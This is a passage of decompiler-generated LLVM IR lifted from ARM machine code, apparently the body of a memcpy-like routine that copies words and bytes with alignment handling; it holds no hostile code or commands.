  br label %dec_label_pc_183dc

dec_label_pc_183f4:                               ; preds = %dec_label_pc_183dc
  %v4_183f4 = add i32 %v0_183ec, -16
  %v6_183f4 = add i32 %v0_183ec, 2147483616
  %v7_183f4 = and i32 %v4_183f4, %v6_183f4
  %v8_183f4 = icmp slt i32 %v7_183f4, 0
  store i1 %v8_183f4, i1* %cpsr_v.global-to-local, align 1
  %v9_183f4 = icmp slt i32 %v4_183f4, 0
  store i1 %v9_183f4, i1* %cpsr_n.global-to-local, align 1
  %v5_183f8 = icmp slt i32 %v2_183ec, -16
  br i1 %v5_183f8, label %.thread2, label %bb130

bb130:                                            ; preds = %dec_label_pc_183f4
  %v6_183f8 = load i32, i32* @r1, align 4
  %v7_183f8 = inttoptr i32 %v6_183f8 to i32*
  %v8_183f8 = load i32, i32* %v7_183f8, align 4
  store i32 %v8_183f8, i32* %r3.global-to-local, align 4
  %v9_183f8 = add i32 %v6_183f8, 4
  %v10_183f8 = inttoptr i32 %v9_183f8 to i32*
  %v11_183f8 = load i32, i32* %v10_183f8, align 4
  store i32 %v11_183f8, i32* %r4.global-to-local, align 4
  %v12_183f8 = add i32 %v6_183f8, 8
  %v13_183f8 = inttoptr i32 %v12_183f8 to i32*
  %v14_183f8 = load i32, i32* %v13_183f8, align 4
  store i32 %v14_183f8, i32* @ip, align 4
  %v15_183f8 = add i32 %v6_183f8, 12
  %v16_183f8 = inttoptr i32 %v15_183f8 to i32*
  %v17_183f8 = load i32, i32* %v16_183f8, align 4
  store i32 %v17_183f8, i32* @lr, align 4
  %v18_183f8 = add i32 %v6_183f8, 16
  store i32 %v18_183f8, i32* @r1, align 4
  %v7_183fc = inttoptr i32 %v12_183e8 to i32*
  store i32 %v8_183f8, i32* %v7_183fc, align 4
  %v9_183fc = add i32 %v0_183e0, 36
  %v10_183fc = inttoptr i32 %v9_183fc to i32*
  %v11_183fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_183fc, i32* %v10_183fc, align 4
  %v12_183fc = add i32 %v0_183e0, 40
  %v13_183fc = inttoptr i32 %v12_183fc to i32*
  %v14_183fc = load i32, i32* @ip, align 4
  store i32 %v14_183fc, i32* %v13_183fc, align 4
  %v15_183fc = add i32 %v0_183e0, 44
  %v16_183fc = inttoptr i32 %v15_183fc to i32*
  %v17_183fc = load i32, i32* @lr, align 4
  store i32 %v17_183fc, i32* %v16_183fc, align 4
  %v18_183fc = add i32 %v0_183e0, 48
  store i32 %v18_183fc, i32* %r0.global-to-local, align 4
  %v6_18400 = load i32, i32* %r2.global-to-local, align 4
  %v7_18400 = add i32 %v6_18400, -16
  store i32 %v7_18400, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_183f4, %bb130
  %v3_18410102 = phi i32 [ %v12_183e8, %dec_label_pc_183f4 ], [ %v18_183fc, %bb130 ]
  %v0_1840896 = phi i32 [ %v2_183ec, %dec_label_pc_183f4 ], [ %v7_18400, %bb130 ]
  %v2_18404 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18404, i32* @r4, align 4
  br label %dec_label_pc_18408

dec_label_pc_18408:                               ; preds = %dec_label_pc_183d0, %.thread2
  %v3_18410101 = phi i32 [ %v0_183e093, %dec_label_pc_183d0 ], [ %v3_18410102, %.thread2 ]
  %v0_18408 = phi i32 [ %v2_183d0, %dec_label_pc_183d0 ], [ %v0_1840896, %.thread2 ]
  %v1_18408 = add i32 %v0_18408, 20
  store i32 %v1_18408, i32* %r2.global-to-local, align 4
  %v3_18408 = sub i32 0, %v0_18408
  %v4_18408 = and i32 %v1_18408, %v3_18408
  %v5_18408 = icmp slt i32 %v4_18408, 0
  store i1 %v5_18408, i1* %cpsr_v.global-to-local, align 1
  %v6_18408 = icmp slt i32 %v1_18408, 0
  store i1 %v6_18408, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1840c

dec_label_pc_1840c:                               ; preds = %.thread118, %dec_label_pc_18408
  %v0_1841c.pre149 = phi i32 [ %v0_1841c.pre, %.thread118 ], [ %v1_18408, %dec_label_pc_18408 ]
  %v3_18410 = phi i32 [ %v3_1841099119, %.thread118 ], [ %v3_18410101, %dec_label_pc_18408 ]
  %v1_18414 = phi i1 [ %v1_18418, %.thread118 ], [ %v5_18408, %dec_label_pc_18408 ]
  %v0_18414 = phi i1 [ %v0_18418, %.thread118 ], [ %v6_18408, %dec_label_pc_18408 ]
  %v2_1840c = xor i1 %v1_18414, %v0_18414
  br i1 %v2_1840c, label %.thread118, label %bb131

bb131:                                            ; preds = %dec_label_pc_1840c
  %v3_1840c = load i32, i32* @r1, align 4
  %v4_1840c = inttoptr i32 %v3_1840c to i32*
  %v5_1840c = load i32, i32* %v4_1840c, align 4
  store i32 %v5_1840c, i32* %r3.global-to-local, align 4
  %v6_1840c = add i32 %v3_1840c, 4
  %v7_1840c = inttoptr i32 %v6_1840c to i32*
  %v8_1840c = load i32, i32* %v7_1840c, align 4
  store i32 %v8_1840c, i32* @ip, align 4
  %v9_1840c = add i32 %v3_1840c, 8
  %v10_1840c = inttoptr i32 %v9_1840c to i32*
  %v11_1840c = load i32, i32* %v10_1840c, align 4
  store i32 %v11_1840c, i32* @lr, align 4
  %v12_1840c = add i32 %v3_1840c, 12
  store i32 %v12_1840c, i32* @r1, align 4
  %v4_18410 = inttoptr i32 %v3_18410 to i32*
  store i32 %v5_1840c, i32* %v4_18410, align 4
  %v6_18410 = add i32 %v3_18410, 4
  %v7_18410 = inttoptr i32 %v6_18410 to i32*
  %v8_18410 = load i32, i32* @ip, align 4
  store i32 %v8_18410, i32* %v7_18410, align 4
  %v9_18410 = add i32 %v3_18410, 8
  %v10_18410 = inttoptr i32 %v9_18410 to i32*
  %v11_18410 = load i32, i32* @lr, align 4
  store i32 %v11_18410, i32* %v10_18410, align 4
  %v12_18410 = add i32 %v3_18410, 12
  store i32 %v12_18410, i32* %r0.global-to-local, align 4
  %v3_18414 = load i32, i32* %r2.global-to-local, align 4
  %v4_18414 = add i32 %v3_18414, -12
  store i32 %v4_18414, i32* %r2.global-to-local, align 4
  %v6_18414 = sub i32 11, %v3_18414
  %v7_18414 = and i32 %v6_18414, %v3_18414
  %v8_18414 = icmp slt i32 %v7_18414, 0
  store i1 %v8_18414, i1* %cpsr_v.global-to-local, align 1
  %v9_18414 = icmp slt i32 %v4_18414, 0
  store i1 %v9_18414, i1* %cpsr_n.global-to-local, align 1
  br label %.thread118

.thread118:                                       ; preds = %dec_label_pc_1840c, %bb131
  %v0_1841c.pre = phi i32 [ %v4_18414, %bb131 ], [ %v0_1841c.pre149, %dec_label_pc_1840c ]
  %v3_1841099119 = phi i32 [ %v12_18410, %bb131 ], [ %v3_18410, %dec_label_pc_1840c ]
  %v1_18418 = phi i1 [ %v8_18414, %bb131 ], [ %v1_18414, %dec_label_pc_1840c ]
  %v0_18418 = phi i1 [ %v9_18414, %bb131 ], [ %v0_18414, %dec_label_pc_1840c ]
  %v2_18418 = xor i1 %v1_18418, %v0_18418
  br i1 %v2_18418, label %dec_label_pc_1841c, label %dec_label_pc_1840c

dec_label_pc_1841c:                               ; preds = %.thread118, %dec_label_pc_183c8
  %v7_1842c = phi i32 [ %v0_183e093, %dec_label_pc_183c8 ], [ %v3_1841099119, %.thread118 ]
  %v0_1841c = phi i32 [ %v2_183c8, %dec_label_pc_183c8 ], [ %v0_1841c.pre, %.thread118 ]
  %v2_1841c = add i32 %v0_1841c, 8
  store i32 %v2_1841c, i32* %r2.global-to-local, align 4
  %v4_1841c = sub i32 0, %v0_1841c
  %v5_1841c = and i32 %v2_1841c, %v4_1841c
  %v6_1841c = icmp slt i32 %v5_1841c, 0
  store i1 %v6_1841c, i1* %cpsr_v.global-to-local, align 1
  %v7_1841c = icmp slt i32 %v2_1841c, 0
  store i1 %v7_1841c, i1* %cpsr_n.global-to-local, align 1
  %v5_18420 = icmp slt i32 %v0_1841c, -8
  br i1 %v5_18420, label %bb133, label %dec_label_pc_18424

dec_label_pc_18424:                               ; preds = %dec_label_pc_1841c
  %v6_18424 = add i32 %v0_1841c, 4
  store i32 %v6_18424, i32* %r2.global-to-local, align 4
  %v8_18424 = sub i32 -5, %v0_1841c
  %v9_18424 = and i32 %v8_18424, %v2_1841c
  %v10_18424 = icmp slt i32 %v9_18424, 0
  store i1 %v10_18424, i1* %cpsr_v.global-to-local, align 1
  %v11_18424 = icmp slt i32 %v6_18424, 0
  store i1 %v11_18424, i1* %cpsr_n.global-to-local, align 1
  %v5_18428 = icmp slt i32 %v2_1841c, 4
  %v6_18428 = load i32, i32* @r1, align 4
  %v7_18428 = inttoptr i32 %v6_18428 to i32*
  %v8_18428 = load i32, i32* %v7_18428, align 4
  store i32 %v8_18428, i32* %r3.global-to-local, align 4
  %v10_18428 = add i32 %v6_18428, 4
  br i1 %v5_18428, label %.thread6, label %bb132

.thread6:                                         ; preds = %dec_label_pc_18424
  store i32 %v10_18428, i32* @r1, align 4
  %v8_1842c = inttoptr i32 %v7_1842c to i32*
  store i32 %v8_18428, i32* %v8_1842c, align 4
  %v9_1842c = load i32, i32* %r0.global-to-local, align 4
  %v10_1842c = add i32 %v9_1842c, 4
  store i32 %v10_1842c, i32* %r0.global-to-local, align 4
  %v0_1843c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb133

bb132:                                            ; preds = %dec_label_pc_18424
  %v10_18430 = inttoptr i32 %v10_18428 to i32*
  %v11_18430 = load i32, i32* %v10_18430, align 4
  store i32 %v11_18430, i32* @ip, align 4
  %v12_18430 = add i32 %v6_18428, 8
  store i32 %v12_18430, i32* @r1, align 4
  %v7_18434 = inttoptr i32 %v7_1842c to i32*
  store i32 %v8_18428, i32* %v7_18434, align 4
  %v9_18434 = add i32 %v7_1842c, 4
  %v10_18434 = inttoptr i32 %v9_18434 to i32*
  %v11_18434 = load i32, i32* @ip, align 4
  store i32 %v11_18434, i32* %v10_18434, align 4
  %v12_18434 = add i32 %v7_1842c, 8
  store i32 %v12_18434, i32* %r0.global-to-local, align 4
  %v6_18438 = load i32, i32* %r2.global-to-local, align 4
  %v7_18438 = add i32 %v6_18438, -4
  store i32 %v7_18438, i32* %r2.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %.thread6, %.thread12, %dec_label_pc_1841c, %bb, %dec_label_pc_185e4, %dec_label_pc_1850c, %dec_label_pc_18578, %bb132
  %v2_1844c = phi i32 [ %v10_1842c, %.thread6 ], [ %v0_184dc76, %.thread12 ], [ %v7_1842c, %dec_label_pc_1841c ], [ %v1_183a0, %bb ], [ %v2_1844c114, %dec_label_pc_185e4 ], [ %v2_1844c113, %dec_label_pc_1850c ], [ %v2_1844c112, %dec_label_pc_18578 ], [ %v12_18434, %bb132 ]
  %v0_1843c = phi i32 [ %v0_1843c.pre, %.thread6 ], [ %v2_18484, %.thread12 ], [ %v2_1841c, %dec_label_pc_1841c ], [ %v2_183b0, %bb ], [ %v0_1843c110, %dec_label_pc_185e4 ], [ %v0_1843c109, %dec_label_pc_1850c ], [ %v0_1843c108, %dec_label_pc_18578 ], [ %v7_18438, %bb132 ]
  %v1_1843c = add i32 %v0_1843c, 4
  store i32 %v1_1843c, i32* @r2, align 4
  %v3_1843c = sub i32 0, %v0_1843c
  %v4_1843c = and i32 %v1_1843c, %v3_1843c
  %v5_1843c = icmp slt i32 %v4_1843c, 0
  store i1 %v5_1843c, i1* %cpsr_v.global-to-local, align 1
  %v6_1843c = icmp slt i32 %v1_1843c, 0
  store i1 %v6_1843c, i1* %cpsr_n.global-to-local, align 1
  %v7_1843c = icmp eq i32 %v1_1843c, 0
  store i1 %v7_1843c, i1* @cpsr_z, align 1
  br i1 %v7_1843c, label %bb134, label %bb135

bb134:                                            ; preds = %bb133
  %v3_18440 = load i8*, i8** %stack_var_-8, align 4
  %v4_18440 = ptrtoint i8* %v3_18440 to i32
  store i32 %v4_18440, i32* %r0.global-to-local, align 4
  ret i32 %v4_18440

bb135:                                            ; preds = %bb133
  %v1_18444 = add i32 %v0_1843c, 2
  %v3_18444 = sub i32 -3, %v0_1843c
  %v4_18444 = and i32 %v3_18444, %v1_1843c
  %v5_18444 = icmp slt i32 %v4_18444, 0
  store i1 %v5_18444, i1* %cpsr_v.global-to-local, align 1
  %v6_18444 = icmp slt i32 %v1_18444, 0
  store i1 %v6_18444, i1* %cpsr_n.global-to-local, align 1
  %v7_18444 = icmp eq i32 %v1_1843c, 2
  store i1 %v7_18444, i1* @cpsr_z, align 1
  %v0_18448 = load i32, i32* @r1, align 4
  %v1_18448 = inttoptr i32 %v0_18448 to i8*
  %v2_18448 = load i8, i8* %v1_18448, align 1
  %v3_18448 = zext i8 %v2_18448 to i32
  store i32 %v3_18448, i32* %r3.global-to-local, align 4
  %v5_18448 = add i32 %v0_18448, 1
  store i32 %v5_18448, i32* @r1, align 4
  %v3_1844c = inttoptr i32 %v2_1844c to i8*
  store i8 %v2_18448, i8* %v3_1844c, align 1
  %v4_1844c = load i32, i32* %r0.global-to-local, align 4
  %v5_1844c = add i32 %v4_1844c, 1
  store i32 %v5_1844c, i32* %r0.global-to-local, align 4
  %v0_18450 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18450 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18450 = xor i1 %v0_18450, %v1_18450
  br i1 %v2_18450, label %.thread120, label %bb136

bb136:                                            ; preds = %bb135
  %v3_18450 = load i32, i32* @r1, align 4
  %v4_18450 = inttoptr i32 %v3_18450 to i8*
  %v5_18450 = load i8, i8* %v4_18450, align 1
  %v6_18450 = zext i8 %v5_18450 to i32
  store i32 %v6_18450, i32* %r3.global-to-local, align 4
  %v8_18450 = add i32 %v3_18450, 1
  store i32 %v8_18450, i32* @r1, align 4
  %v6_18454 = inttoptr i32 %v5_1844c to i8*
  store i8 %v5_18450, i8* %v6_18454, align 1
  %v7_18454 = load i32, i32* %r0.global-to-local, align 4
  %v8_18454 = add i32 %v7_18454, 1
  store i32 %v8_18454, i32* %r0.global-to-local, align 4
  %v1_18458.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18458.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread120

.thread120:                                       ; preds = %bb135, %bb136
  %v7_1845c = phi i32 [ %v8_18454, %bb136 ], [ %v5_1844c, %bb135 ]
  %v2_1845c = phi i1 [ %v2_18458.pre, %bb136 ], [ %v1_18450, %bb135 ]
  %v1_1845c = phi i1 [ %v1_18458.pre, %bb136 ], [ %v0_18450, %bb135 ]
  %v0_18458 = load i1, i1* @cpsr_z, align 1
  %v3_18458 = xor i1 %v2_1845c, %v1_1845c
  %v4_18458 = or i1 %v0_18458, %v3_18458
  br i1 %v4_18458, label %.thread121, label %bb137

bb137:                                            ; preds = %.thread120
  %v5_18458 = load i32, i32* @r1, align 4
  %v6_18458 = inttoptr i32 %v5_18458 to i8*
  %v7_18458 = load i8, i8* %v6_18458, align 1
  %v8_18458 = zext i8 %v7_18458 to i32
  store i32 %v8_18458, i32* %r3.global-to-local, align 4
  %v10_18458 = add i32 %v5_18458, 1
  store i32 %v10_18458, i32* @r1, align 4
  %v8_1845c = inttoptr i32 %v7_1845c to i8*
  store i8 %v7_18458, i8* %v8_1845c, align 1
  %v9_1845c = load i32, i32* %r0.global-to-local, align 4
  %v10_1845c = add i32 %v9_1845c, 1
  store i32 %v10_1845c, i32* %r0.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %.thread120, %bb137
  %v2_18460 = load i8*, i8** %stack_var_-8, align 4
  %v3_18460 = ptrtoint i8* %v2_18460 to i32
  store i32 %v3_18460, i32* %r0.global-to-local, align 4
  ret i32 %v3_18460

dec_label_pc_18464:                               ; preds = %dec_label_pc_183b8
  %v1_18464 = sub nsw i32 4, %v1_183b8
  store i32 %v1_18464, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_18468 = icmp ult i32 %v1_18464, 2
  store i1 %v8_18468, i1* %cpsr_n.global-to-local, align 1
  %v1_1846c = inttoptr i32 %v0_183a0 to i8*
  %v2_1846c = load i8, i8* %v1_1846c, align 1
  %v3_1846c = zext i8 %v2_1846c to i32
  store i32 %v3_1846c, i32* %r3.global-to-local, align 4
  %v5_1846c = add i32 %v0_183a0, 1
  store i32 %v5_1846c, i32* @r1, align 4
  store i8 %v2_1846c, i8* %v5_183ac, align 1
  %v4_18470 = load i32, i32* %r0.global-to-local, align 4
  %v5_18470 = add i32 %v4_18470, 1
  store i32 %v5_18470, i32* %r0.global-to-local, align 4
  br i1 %v8_18468, label %.thread12, label %bb138

bb138:                                            ; preds = %dec_label_pc_18464
  %v9_18468 = icmp eq i32 %v1_18464, 2
  %v6_18474 = load i32, i32* @r1, align 4
  %v7_18474 = inttoptr i32 %v6_18474 to i8*
  %v8_18474 = load i8, i8* %v7_18474, align 1
  %v9_18474 = zext i8 %v8_18474 to i32
  store i32 %v9_18474, i32* %r3.global-to-local, align 4
  %v11_18474 = add i32 %v6_18474, 1
  store i32 %v11_18474, i32* @r1, align 4
  %v9_18478 = inttoptr i32 %v5_18470 to i8*
  store i8 %v8_18474, i8* %v9_18478, align 1
  %v10_18478 = load i32, i32* %r0.global-to-local, align 4
  %v11_18478 = add i32 %v10_18478, 1
  store i32 %v11_18478, i32* %r0.global-to-local, align 4
  br i1 %v9_18468, label %.thread12, label %bb139

bb139:                                            ; preds = %bb138
  %v8_1847c = load i32, i32* @r1, align 4
  %v9_1847c = inttoptr i32 %v8_1847c to i8*
  %v10_1847c = load i8, i8* %v9_1847c, align 1
  %v11_1847c = zext i8 %v10_1847c to i32
  store i32 %v11_1847c, i32* %r3.global-to-local, align 4
  %v13_1847c = add i32 %v8_1847c, 1
  store i32 %v13_1847c, i32* @r1, align 4
  %v11_18480 = inttoptr i32 %v11_18478 to i8*
  store i8 %v10_1847c, i8* %v11_18480, align 1
  %v12_18480 = load i32, i32* %r0.global-to-local, align 4
  %v13_18480 = add i32 %v12_18480, 1
  store i32 %v13_18480, i32* %r0.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb138, %dec_label_pc_18464, %bb139
  %v0_184dc76 = phi i32 [ %v11_18478, %bb138 ], [ %v5_18470, %dec_label_pc_18464 ], [ %v13_18480, %bb139 ]
  %v0_18484 = load i32, i32* %r2.global-to-local, align 4
  %v1_18484 = load i32, i32* @ip, align 4
  %v2_18484 = sub i32 %v0_18484, %v1_18484
  store i32 %v2_18484, i32* %r2.global-to-local, align 4
  %v4_18484 = xor i32 %v1_18484, %v0_18484
  %v5_18484 = xor i32 %v2_18484, %v0_18484
  %v6_18484 = and i32 %v5_18484, %v4_18484
  %v7_18484 = icmp slt i32 %v6_18484, 0
  store i1 %v7_18484, i1* %cpsr_v.global-to-local, align 1
  %v8_18484 = icmp slt i32 %v2_18484, 0
  store i1 %v8_18484, i1* %cpsr_n.global-to-local, align 1
  %v5_18488 = icmp slt i32 %v0_18484, %v1_18484
  br i1 %v5_18488, label %bb133, label %dec_label_pc_1848c

dec_label_pc_1848c:                               ; preds = %.thread12
  %v0_1848c = load i32, i32* @r1, align 4
  %v1_1848c = urem i32 %v0_1848c, 4
  store i32 %v1_1848c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1848c = icmp eq i32 %v1_1848c, 0
  %extract.t124 = trunc i32 %v0_1848c to i2
  br i1 %v2_1848c, label %dec_label_pc_183c8, label %dec_label_pc_18494

dec_label_pc_18494:                               ; preds = %dec_label_pc_183c0, %dec_label_pc_1848c
  %v0_184dc75 = phi i32 [ %v1_183a0, %dec_label_pc_183c0 ], [ %v0_184dc76, %dec_label_pc_1848c ]
  %v0_18588 = phi i32 [ %v2_183b0, %dec_label_pc_183c0 ], [ %v2_18484, %dec_label_pc_1848c ]
  %v0_1849c.off0 = phi i2 [ %extract.t, %dec_label_pc_183c0 ], [ %extract.t124, %dec_label_pc_1848c ]
  %v0_18494 = phi i32 [ %v0_183a0, %dec_label_pc_183c0 ], [ %v0_1848c, %dec_label_pc_1848c ]
  %v1_18494 = and i32 %v0_18494, -4
  store i32 %v1_18494, i32* %r1.global-to-local, align 4
  %v1_18498 = inttoptr i32 %v1_18494 to i32*
  %v2_18498 = load i32, i32* %v1_18498, align 4
  store i32 %v2_18498, i32* @lr, align 4
  %v4_18498 = add i32 %v1_18494, 4
  store i32 %v4_18498, i32* %r1.global-to-local, align 4
  %v2_18580 = add i32 %v0_18588, -12
  %v4_18580 = sub i32 11, %v0_18588
  %v5_18580 = and i32 %v4_18580, %v0_18588
  %v6_18580 = icmp slt i32 %v5_18580, 0
  store i1 %v6_18580, i1* %cpsr_v.global-to-local, align 1
  %v7_18580 = icmp slt i32 %v2_18580, 0
  store i1 %v7_18580, i1* %cpsr_n.global-to-local, align 1
  %v5_18584 = icmp slt i32 %v0_18588, 12
  switch i2 %v0_1849c.off0, label %dec_label_pc_184a8 [
    i2 -1, label %dec_label_pc_18580
    i2 -2, label %dec_label_pc_18514
  ]

dec_label_pc_184a8:                               ; preds = %dec_label_pc_18494
  br i1 %v5_18584, label %dec_label_pc_184f4, label %dec_label_pc_184b0

dec_label_pc_184b0:                               ; preds = %dec_label_pc_184a8
  store i32 %v2_18580, i32* %r2.global-to-local, align 4
  %v3_184b4 = load i32, i32* @r4, align 4
  store i32 %v3_184b4, i32* %stack_var_-16, align 4
  %v6_184b4 = load i32, i32* @r5, align 4
  store i32 %v6_184b4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_184b8

dec_label_pc_184b8:                               ; preds = %dec_label_pc_184b8.dec_label_pc_184b8_crit_edge, %dec_label_pc_184b0
  %v0_184dc = phi i32 [ %v12_184dc, %dec_label_pc_184b8.dec_label_pc_184b8_crit_edge ], [ %v0_184dc75, %dec_label_pc_184b0 ]
  %v0_184bc = phi i32 [ %v0_184bc.pre, %dec_label_pc_184b8.dec_label_pc_184b8_crit_edge ], [ %v4_18498, %dec_label_pc_184b0 ]
  %v0_184b8 = phi i32 [ %v0_184b8.pre, %dec_label_pc_184b8.dec_label_pc_184b8_crit_edge ], [ %v2_18498, %dec_label_pc_184b0 ]
  %v3_184b8 = udiv i32 %v0_184b8, 256
  store i32 %v3_184b8, i32* %r3.global-to-local, align 4
  %v1_184bc = inttoptr i32 %v0_184bc to i32*
  %v2_184bc = load i32, i32* %v1_184bc, align 4
  store i32 %v2_184bc, i32* %r4.global-to-local, align 4
  %v3_184bc = add i32 %v0_184bc, 4
  %v4_184bc = inttoptr i32 %v3_184bc to i32*
  %v5_184bc = load i32, i32* %v4_184bc, align 4
  store i32 %v5_184bc, i32* %r5.global-to-local, align 4
  %v6_184bc = add i32 %v0_184bc, 8
  %v7_184bc = inttoptr i32 %v6_184bc to i32*
  %v8_184bc = load i32, i32* %v7_184bc, align 4
  store i32 %v8_184bc, i32* %ip.global-to-local, align 4
  %v9_184bc = add i32 %v0_184bc, 12
  %v10_184bc = inttoptr i32 %v9_184bc to i32*
  %v11_184bc = load i32, i32* %v10_184bc, align 4
  store i32 %v11_184bc, i32* @lr, align 4
  %v12_184bc = add i32 %v0_184bc, 16
  store i32 %v12_184bc, i32* %r1.global-to-local, align 4
  %v4_184c0 = mul i32 %v2_184bc, 16777216
  %v5_184c0 = or i32 %v4_184c0, %v3_184b8
  store i32 %v5_184c0, i32* %r3.global-to-local, align 4
  %v3_184c4 = udiv i32 %v2_184bc, 256
  %v4_184c8 = mul i32 %v5_184bc, 16777216
  %v5_184c8 = or i32 %v4_184c8, %v3_184c4
  store i32 %v5_184c8, i32* %r4.global-to-local, align 4
  %v3_184cc = udiv i32 %v5_184bc, 256
  %v4_184d0 = mul i32 %v8_184bc, 16777216
  %v5_184d0 = or i32 %v4_184d0, %v3_184cc
  store i32 %v5_184d0, i32* %r5.global-to-local, align 4
  %v3_184d4 = udiv i32 %v8_184bc, 256
  %v4_184d8 = mul i32 %v11_184bc, 16777216
  %v5_184d8 = or i32 %v4_184d8, %v3_184d4
  store i32 %v5_184d8, i32* @ip, align 4
  %v1_184dc = inttoptr i32 %v0_184dc to i32*
  store i32 %v5_184c0, i32* %v1_184dc, align 4
  %v3_184dc = add i32 %v0_184dc, 4
  %v4_184dc = inttoptr i32 %v3_184dc to i32*
  %v5_184dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_184dc, i32* %v4_184dc, align 4
  %v6_184dc = add i32 %v0_184dc, 8
  %v7_184dc = inttoptr i32 %v6_184dc to i32*
  %v8_184dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_184dc, i32* %v7_184dc, align 4
  %v9_184dc = add i32 %v0_184dc, 12
  %v10_184dc = inttoptr i32 %v9_184dc to i32*
  %v11_184dc = load i32, i32* @ip, align 4
  store i32 %v11_184dc, i32* %v10_184dc, align 4
  %v12_184dc = add i32 %v0_184dc, 16
  store i32 %v12_184dc, i32* %r0.global-to-local, align 4
  %v0_184e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_184e0 = add i32 %v0_184e0, -16
  store i32 %v2_184e0, i32* %r2.global-to-local, align 4
  %v6_184e4 = icmp slt i32 %v0_184e0, 16
  br i1 %v6_184e4, label %dec_label_pc_184e8, label %dec_label_pc_184b8.dec_label_pc_184b8_crit_edge

dec_label_pc_184b8.dec_label_pc_184b8_crit_edge:  ; preds = %dec_label_pc_184b8
  %v0_184b8.pre = load i32, i32* @lr, align 4
  %v0_184bc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_184b8

dec_label_pc_184e8:                               ; preds = %dec_label_pc_184b8
  %v2_184e8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_184e8, i32* @r4, align 4
  %v5_184e8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_184e8, i32* @r5, align 4
  %v2_184ec = add i32 %v0_184e0, -4
  store i32 %v2_184ec, i32* %r2.global-to-local, align 4
  %v4_184ec = add i32 %v0_184e0, 2147483632
  %v5_184ec = and i32 %v2_184ec, %v4_184ec
  %v6_184ec = icmp slt i32 %v5_184ec, 0
  store i1 %v6_184ec, i1* %cpsr_v.global-to-local, align 1
  %v7_184ec = icmp slt i32 %v2_184ec, 0
  store i1 %v7_184ec, i1* %cpsr_n.global-to-local, align 1
  %v5_184f0 = icmp slt i32 %v2_184e0, -12
  br i1 %v5_184f0, label %dec_label_pc_1850c, label %dec_label_pc_184f4

dec_label_pc_184f4:                               ; preds = %dec_label_pc_184e8, %dec_label_pc_184a8, %dec_label_pc_184f4
  %v1_18500 = phi i32 [ %v4_18500, %dec_label_pc_184f4 ], [ %v12_184dc, %dec_label_pc_184e8 ], [ %v0_184dc75, %dec_label_pc_184a8 ]
  %v0_184f4 = load i32, i32* @lr, align 4
  %v3_184f4 = udiv i32 %v0_184f4, 256
  store i32 %v3_184f4, i32* %ip.global-to-local, align 4
  %v0_184f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_184f8 = inttoptr i32 %v0_184f8 to i32*
  %v2_184f8 = load i32, i32* %v1_184f8, align 4
  store i32 %v2_184f8, i32* @lr, align 4
  %v4_184f8 = add i32 %v0_184f8, 4
  store i32 %v4_184f8, i32* %r1.global-to-local, align 4
  %v4_184fc = mul i32 %v2_184f8, 16777216
  %v5_184fc = or i32 %v4_184fc, %v3_184f4
  store i32 %v5_184fc, i32* @ip, align 4
  %v2_18500 = inttoptr i32 %v1_18500 to i32*
  store i32 %v5_184fc, i32* %v2_18500, align 4
  %v3_18500 = load i32, i32* %r0.global-to-local, align 4
  %v4_18500 = add i32 %v3_18500, 4
  store i32 %v4_18500, i32* %r0.global-to-local, align 4
  %v0_18504 = load i32, i32* %r2.global-to-local, align 4
  %v2_18504 = add i32 %v0_18504, -4
  store i32 %v2_18504, i32* %r2.global-to-local, align 4
  %v6_18508 = icmp slt i32 %v0_18504, 4
  br i1 %v6_18508, label %dec_label_pc_1850c.loopexit, label %dec_label_pc_184f4

dec_label_pc_1850c.loopexit:                      ; preds = %dec_label_pc_184f4
  %v4_18504 = sub i32 3, %v0_18504
  %v5_18504 = and i32 %v4_18504, %v0_18504
  %v6_18504 = icmp slt i32 %v5_18504, 0
  %v7_18504 = icmp slt i32 %v2_18504, 0
  store i1 %v6_18504, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18504, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1850c

dec_label_pc_1850c:                               ; preds = %dec_label_pc_1850c.loopexit, %dec_label_pc_184e8
  %v2_1844c113 = phi i32 [ %v4_18500, %dec_label_pc_1850c.loopexit ], [ %v12_184dc, %dec_label_pc_184e8 ]
  %v0_1843c109 = phi i32 [ %v2_18504, %dec_label_pc_1850c.loopexit ], [ %v2_184ec, %dec_label_pc_184e8 ]
  %v0_1850c = load i32, i32* %r1.global-to-local, align 4
  %v1_1850c = add i32 %v0_1850c, -3
  store i32 %v1_1850c, i32* @r1, align 4
  br label %bb133

dec_label_pc_18514:                               ; preds = %dec_label_pc_18494
  br i1 %v5_18584, label %dec_label_pc_18560, label %dec_label_pc_1851c

dec_label_pc_1851c:                               ; preds = %dec_label_pc_18514
  store i32 %v2_18580, i32* %r2.global-to-local, align 4
  %v3_18520 = load i32, i32* @r4, align 4
  store i32 %v3_18520, i32* %stack_var_-16, align 4
  %v6_18520 = load i32, i32* @r5, align 4
  store i32 %v6_18520, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18524

dec_label_pc_18524:                               ; preds = %dec_label_pc_18524.dec_label_pc_18524_crit_edge, %dec_label_pc_1851c
  %v0_18548 = phi i32 [ %v12_18548, %dec_label_pc_18524.dec_label_pc_18524_crit_edge ], [ %v0_184dc75, %dec_label_pc_1851c ]
